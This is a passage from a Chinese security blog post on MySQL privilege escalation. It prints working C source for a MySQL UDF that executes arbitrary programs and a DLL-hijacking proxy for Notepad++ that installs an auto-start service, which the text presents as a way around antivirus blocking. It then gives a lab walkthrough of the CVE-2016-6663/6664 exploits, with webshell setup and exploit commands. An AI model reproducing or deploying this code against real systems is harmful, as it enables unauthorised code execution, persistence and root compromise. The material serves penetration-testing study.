+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Urlmon.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mysql.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"resource.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"netapi32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Urlmon.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE g_module;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HINSTANCE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        g_module = hModule;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function">my_bool <span class="title">adduser_init</span><span class="params">(MSXU_INIT *initid, MSXU_ARGS *args, <span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//return 1出错  ,0 正常</span></span><br><span class="line">    initid-&gt;max_length=<span class="number">65</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">char</span> *<span class="title">adduser</span><span class="params">(MSXU_INIT *initid, MSXU_ARGS *args,<span class="keyword">char</span> *result, <span class="keyword">unsigned</span> <span class="keyword">long</span> *length,<span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(args-&gt;arg_count!=<span class="number">1</span> || args-&gt;arg_type[<span class="number">0</span>]!=STRING_RESULT || stricmp(args-&gt;args[<span class="number">0</span>],<span class="string">"help"</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      initid-&gt;ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">200</span>);</span><br><span class="line">      <span class="keyword">if</span> (initid-&gt;ptr == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(initid-&gt;ptr, <span class="string">"use:select adduser(\"path\")"</span>);</span><br><span class="line">      *length = <span class="built_in">strlen</span>(initid-&gt;ptr);</span><br><span class="line">      <span class="keyword">return</span> initid-&gt;ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      initid-&gt;ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">200</span>);</span><br><span class="line">      <span class="keyword">if</span> (initid-&gt;ptr == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(initid-&gt;ptr, args-&gt;args[<span class="number">0</span>]);</span><br><span class="line">      PROCESS_INFORMATION pi;</span><br><span class="line">      STARTUPINFO si;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line">      si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">      si.wShowWindow = SW_SHOW;</span><br><span class="line">      si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">      <span class="keyword">bool</span> fRet = CreateProcess(args-&gt;args[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">      *length = <span class="built_in">strlen</span>(initid-&gt;ptr);</span><br><span class="line">      <span class="keyword">return</span> initid-&gt;ptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">void</span> <span class="title">adduser_deinit</span><span class="params">(MSXU_INIT *initid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(initid-&gt;ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">free</span>(initid-&gt;ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<p><img src="../images/mysqludf/11.png" alt="image"></p>
+<p>被拦截，然后我们使用mysql劫持notepad创建服务启动notepad，再用另一个notepad启动木马即可绕过。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:Scintilla_DirectFunction=_DLLHijacker_Scintilla_DirectFunction,@1"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXTERNC extern <span class="meta-string">"C"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAKED __declspec(naked)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPORT __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCPP EXPORT NAKED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALSTD EXTERNC EXPORT NAKED void __stdcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCFAST EXTERNC EXPORT NAKED void __fastcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCDECL EXTERNC NAKED void __cdecl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> DLLHijacker</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE m_hModule = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD m_dwReturn[<span class="number">17</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> BOOL WINAPI <span class="title">Load</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TCHAR tzPath[MAX_PATH];</span><br><span class="line">        lstrcpy(tzPath, TEXT(<span class="string">"SciLexer1.dll"</span>));</span><br><span class="line">        m_hModule = LoadLibrary(tzPath);</span><br><span class="line">        <span class="keyword">if</span> (m_hModule == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">return</span> (m_hModule != <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> VOID WINAPI <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m_hModule)</span><br><span class="line">            FreeLibrary(m_hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        FARPROC fpAddress;</span><br><span class="line">        CHAR szProcName[<span class="number">16</span>];</span><br><span class="line">        fpAddress = GetProcAddress(m_hModule, pszProcName);</span><br><span class="line">        <span class="keyword">if</span> (fpAddress == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (HIWORD(pszProcName) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                wsprintf(szProcName, <span class="string">"%d"</span>, pszProcName);</span><br><span class="line">                pszProcName = szProcName;</span><br><span class="line">            &#125;</span><br><span class="line">            ExitProcess(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fpAddress;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动服务</span></span><br><span class="line"><span class="function">BOOL <span class="title">StartSampleService</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SERVICE_STATUS status;</span><br><span class="line">    SC_HANDLE schSCManager = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);   <span class="comment">// 打开服务控制管</span></span><br><span class="line">     <span class="comment">//理数据库，并返回服务控制管理数据库的句柄</span></span><br><span class="line">    <span class="keyword">if</span> (schSCManager == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SC_HANDLE schService = OpenService(schSCManager,<span class="string">"Socks5"</span>,SERVICE_ALL_ACCESS | DELETE);    <span class="comment">// 获得服务句柄</span></span><br><span class="line">    <span class="keyword">if</span> (schService == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    QueryServiceStatus(schService, &amp;status);   <span class="comment">// 获得服务的当前状态</span></span><br><span class="line">    <span class="keyword">if</span> (status.dwCurrentState = SERVICE_STOPPED)   <span class="comment">// 如果服务处于停止状态，则将其状态设置为启动</span></span><br><span class="line">        <span class="comment">//状态</span></span><br><span class="line">        StartService(schService, <span class="number">0</span>, <span class="literal">NULL</span>);   <span class="comment">//启动服务</span></span><br><span class="line">    CloseServiceHandle(schSCManager);   <span class="comment">// 关闭服务句柄</span></span><br><span class="line">    CloseServiceHandle(schService);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> DLLHijacker;</span><br><span class="line">SC_HANDLE schSCManager;</span><br><span class="line">SC_HANDLE schService;</span><br><span class="line"><span class="function">VOID <span class="title">Hijack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SC_HANDLE schSCManager = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    SC_HANDLE hServ = OpenService(schSCManager, <span class="string">"Socks5"</span>, SERVICE_QUERY_STATUS);</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">256</span>] = <span class="string">"C:/phpstudy/anzhuang/WWW/cmd/notepad++.exe"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!hServ)</span><br><span class="line">    &#123;</span><br><span class="line">        SC_HANDLE schService = CreateService(schSCManager, <span class="string">"Socks5"</span>, <span class="string">"Socks5"</span>,</span><br><span class="line">            SERVICE_ALL_ACCESS,</span><br><span class="line">            SERVICE_WIN32_OWN_PROCESS,</span><br><span class="line">            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,</span><br><span class="line">            path,</span><br><span class="line">            <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);    <span class="comment">//安装服务</span></span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(schSCManager);    <span class="comment">//关闭服务句柄</span></span><br><span class="line">    CloseServiceHandle(hServ);</span><br><span class="line">    CloseServiceHandle(schService);</span><br><span class="line">    BOOL x= StartSampleService();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        <span class="keyword">if</span> (Load())</span><br><span class="line">            Hijack();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">    &#123;</span><br><span class="line">        Free();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ALCDECL <span class="title">DLLHijacker_Scintilla_DirectFunction</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm POP m_dwReturn[<span class="number">0</span> * TYPE <span class="keyword">long</span>];</span><br><span class="line">    GetAddress(<span class="string">"Scintilla_DirectFunction"</span>)();</span><br><span class="line">    __asm JMP m_dwReturn[<span class="number">0</span> * TYPE <span class="keyword">long</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/mysqludf/12.png" alt="image"></p>
+<h2 id="CVE-2016-6663和CVE-2016-6664提权"><a href="#CVE-2016-6663和CVE-2016-6664提权" class="headerlink" title="CVE-2016-6663和CVE-2016-6664提权"></a>CVE-2016-6663和CVE-2016-6664提权</h2><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
+<p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。<br>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。<br>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p>
+<p>CVE-2016-6663利用条件</p>
+<ul>
+<li>1.已经getshell，获得www-data权限</li>
+<li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li>
+<li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li>
+<li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<p>CVE-2016-6664利用条件</p>
+<ul>
+<li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li>
+<li>2.需要在mysql权限下运行才能利用</li>
+<li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<p>先pull一个lamp的环境：</p>
+<p><img src="../images/mysqludf/13.png" alt="image"></p>
+<p>启动并连接docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P tutum/lamp</span><br><span class="line">docker ps</span><br><span class="line">docker exec -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="../images/mysqludf/14.png" alt="image"></p>
+<p>然后安装一些依赖 wget、gcc、libmysqlclient-dev</p>
+<p>然后写入一句话木马：</p>
+<p><img src="../images/mysqludf/15.png" alt="image"></p>
+<p>给权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>
+<p>然后创建一个有权限的用户。</p>
+<p><img src="../images/mysqludf/16.png" alt="image"></p>
+<p>重启一下服务：</p>
+<p>然后打包，重新启动：</p>
+<p><img src="../images/mysqludf/17.png" alt="image"></p>
+<p>访问，</p>
+<p><img src="../images/mysqludf/18.png" alt="image"></p>
+<p>链接刚才的webshell，权限为www-data</p>
+<p><img src="../images/mysqludf/19.png" alt="image"></p>
+<p>新建我们的exp（ <a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html）编译并运行：" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html）编译并运行：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br><span class="line">./mysql-privesc-race test 123456 localhost test</span><br></pre></td></tr></table></figure>
+<p><img src="../images/mysqludf/20.png" alt="image"></p>
+<h3 id="mysql提升为root权限"><a href="#mysql提升为root权限" class="headerlink" title="mysql提升为root权限"></a>mysql提升为root权限</h3><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mysql/conf.d/mysqld_safe_syslog.cnf</span><br></pre></td></tr></table></figure>
+<p>删除掉syslog，然后重启mysql，</p>
+<p>然后下载exp（CVE-2016-6664 exp网址：<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html）" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html）</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 mysql-chowned.sh</span><br><span class="line">./mysql-chowned.sh /var/log/mysql/error.log</span><br></pre></td></tr></table></figure>
+<p><img src="../images/mysqludf/21.png" alt="image"></p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p>
+<p><a href="https://xz.aliyun.com/t/739" target="_blank" rel="noopener">https://xz.aliyun.com/t/739</a></p>
+<p><a href="http://www.aiyuanzhen.com/index.php/archives/174/" target="_blank" rel="noopener">http://www.aiyuanzhen.com/index.php/archives/174/</a></p>
+<p><a href="https://maikefee.com/archives/9ccf323f.html" target="_blank" rel="noopener">https://maikefee.com/archives/9ccf323f.html</a></p>
+<p><a href="http://what-when-how.com/Tutorial/topic-443fuj/MySQL-51-Plugin-Development-20.html" target="_blank" rel="noopener">http://what-when-how.com/Tutorial/topic-443fuj/MySQL-51-Plugin-Development-20.html</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1021193" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1021193</a></p>
+<p><a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/" target="_blank" rel="noopener">https://osandamalith.com/2018/02/11/mysql-udf-exploitation/</a></p>
+<p><a href="http://www.ba0z1.com/archives/4.html" target="_blank" rel="noopener">http://www.ba0z1.com/archives/4.html</a></p>
+<p><a href="https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/mysqludf/">小议Mysql提权</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年04月02日 - 14:04</p>
+  <p><span>最后更新:</span>2020年04月05日 - 18:04</p>
+  <p><span>原始链接:</span><a href="/mysqludf/" title="小议Mysql提权">https://lengjibo.github.io/mysqludf/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/mysqludf/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/token/" rel="next" title="Windows Access Token Manipulation　Attack">
+                <i class="fa fa-chevron-left"></i> Windows Access Token Manipulation　Attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/empire/" rel="prev" title="bypassASMI">
+                bypassASMI <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
